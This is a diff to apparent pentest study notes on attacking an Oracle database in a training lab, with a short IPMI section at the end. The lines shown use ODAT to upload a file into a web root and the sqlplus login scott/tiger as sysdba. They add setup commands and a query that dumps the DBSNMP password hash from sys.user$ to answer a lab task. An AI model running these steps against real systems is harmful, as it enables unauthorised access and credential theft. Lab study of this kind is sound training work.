@@ -1070,7 +1070,28 @@ $echo "Oracle File Upload Test" > testing.txt
 $./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 finally we can test if the file upload approach worked with curl. therefore we will use a GET http://<ip> request
 $curl -X GET http://10.129.204.235/testing.txt
-
+<test>Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+sudo mkdir -p /opt/oracle
+sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+source ~/.bashrc
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+->python3 odat.py all -s STMIP ->  sqlplus scott/tiger@STMIP/XE as sysdba
+->select name, password from sys.user$ where name = 'DBSNMP';
 \\IPMI=====================================================================
 Intelligent Platform Management Interface is a set of standardized specifications for hardware-based host management systems used to system management and monitoring. it acts as an autonomous subsystem and works independently of the host's BIOS,CPU, firmware and underlying OS.
 -IPMI provides sysadmins wih the ability to manage and monitor systems even if they are powered off or in an unresponsive state.
